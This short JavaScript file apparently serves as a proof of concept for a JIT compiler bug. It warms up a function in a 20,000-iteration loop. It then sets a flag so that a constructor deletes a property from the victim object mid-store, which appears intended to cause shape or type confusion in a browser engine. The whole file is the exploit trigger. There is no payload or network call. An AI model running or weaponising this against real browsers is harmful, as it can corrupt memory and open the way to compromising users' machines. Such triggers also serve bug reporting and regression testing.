let trigger_poc = false;
let o_victim;

class Trigger {
    constructor() {
        if (trigger_poc) {
            delete o_victim.p0;
        }
    }
}

function func_to_jit(o) {
    o_victim = o;
    o.p1 = new Trigger();
}

for (let i = 0; i < 20000; i++) {
    let obj = { p0: 1 };
    func_to_jit(obj);
}

trigger_poc = true;
let trigger_obj = { p0: 1 };
func_to_jit(trigger_obj);